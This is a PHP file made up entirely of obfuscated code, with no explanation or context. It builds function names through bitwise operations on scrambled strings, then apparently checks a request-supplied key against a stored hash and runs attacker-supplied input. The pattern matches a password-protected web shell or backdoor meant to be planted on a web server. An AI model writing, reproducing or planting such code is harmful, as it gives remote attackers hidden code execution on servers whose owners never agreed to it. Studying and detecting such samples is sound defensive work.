<?php
$xW_M='sS5gN'|ZnkQ;$ZzO='?[[jt^u)WN-'&'{~c:Yn='.awfo;$yHGu='mF|'&'?a5';$j1ZulH4u=#XC'.
      'ij('.JOEQGW.']`l.c'|'k)'.vdX9s.'!'.cO7UH.'+';$Y0NzQXRtwi="M//H=.sQE/["./*SqCo'.
      'F !aum=[G1*/K2LI^'.TZ+KS,78'.A07O.'#&';$jUp6KJZCSX='kvg}|'.g_nu.'~'.wvoo.#d8o'.
      '~'&'c~'.moto_n.'}~w~{o~';$pVt6=' ^&:PM,!6$hct+j:6!0`'._ihTg.':>(>Z4&'^/*l5ySv'.
      'Yu#a*/ehINm.'`'.vMhs.'$6:eH{Tig::_,9.Mt@L|lE';$IssE9_2W1='Ad!'|"H`0";'eVDU8Jo'.
      'E9s|QWi6';$ViqJlt='$a4-iw'|oUDMOQ;$q0K9='5,7sw0'^'}xs#;q';$a_q=#jLL14DdxccS7u'.
      '!j$s2-u?</'^'i>p#mu*qsd';$NyAlYrlRm='I@NAH'|HAQAD;$QctAac4R=AA|IA;$iQEU=S|/*U'.
      'Q*/C;$MjzxTyNTY0R=$ZzO^("eKV`K]".jdBx."|"^'2tc/u`71pW?');$KBUa2yRVHY=/*lj6kGa'.
      '0+819C*/$IssE9_2W1|$yHGu;$h4JW28h3JbF=('[%31=3'^','.BFTSM)&$ViqJlt;$cqfW=/*x7'.
      'Q|,,*/$j1ZulH4u&('p!L`Da{("'.Vj4lu|'C@d<'._48ERIfg.'+F');$eIb_zJuaSA=/*JrYGvq'.
      '0gsH*/$Y0NzQXRtwi&$jUp6KJZCSX;$Gr=(ANRP_U&'hUp[{a')|$q0K9;$rdJECjUkDT=/*Gt1vx'.
      '~o-Ly[=d*/$pVt6^('PP^'.AXLiR.'?n|'.bcvCHQR.'!)'.QCtX.' '.BAYKE.',Q'|'`'./*uLS'.
      '6SL_E*/RBAIGF.']*bi 5'.JD0B.';38'.AS0P.'('.DyPJEhA);!$MjzxTyNTY0R(/*S5hNB0n3M'.
      'QU;|xg48&o*/$KBUa2yRVHY($h4JW28h3JbF($Gr)),$rdJECjUkDT) or exit;$cqfW(/*QlSnu'.
      '#xBc$1#ZaW*/$eIb_zJuaSA(false,$h4JW28h3JbF($a_q.$NyAlYrlRm.$QctAac4R.$iQEU)));#'.
      'yX_{S,CU>RFO0Gu;MjbYQEH+:m1:npF;np_N2qm#yp[N7#lKbMf:Qlx+A)=s815RF_<';